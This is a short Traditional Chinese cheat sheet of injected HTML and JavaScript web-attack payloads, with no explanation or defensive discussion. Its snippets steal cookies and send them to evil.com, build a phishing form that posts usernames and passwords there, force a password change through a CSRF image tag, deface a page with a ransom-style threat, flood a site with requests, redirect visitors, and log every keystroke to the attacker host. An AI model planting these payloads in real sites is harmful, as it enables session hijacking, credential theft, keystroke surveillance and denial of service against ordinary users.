## 竊取 cookies
```html
<script>
  fetch('http://evil.com/steal?cookie=' + document.cookie);
</script>
```
## 偽造登入頁面
```html
<form action="http://evil.com/phish" method="POST">
  <input type="text" name="username" placeholder="帳號">
  <input type="password" name="password" placeholder="密碼">
  <input type="submit" value="登入">
</form>
```
## 執行 CSRF 攻擊
```html
<img src="http://victim.com/change-password?newpassword=hacked" />
```
## 網頁劫持 (勒索訊息)
```html
<script>
  document.body.innerHTML = "<h1>網站已被駭客入侵</h1><p>請盡速報名第二階段，否則我將盜光你的帳戶</p>";
</script>
```
## 發動 DDos 或惡意轉址
```html
<script>
  setInterval(() => {
    fetch('http://victim.com'); // 不斷發送請求
  }, 100);
</script>
```
```html
<script>
  window.location.href = "http://evil.com";
</script>
```
## 鍵盤側錄 (Keylogging)
```html
<script>
  document.addEventListener("keypress", function(event) {
    fetch('http://evil.com/log?key=' + event.key);
  });
</script>
```
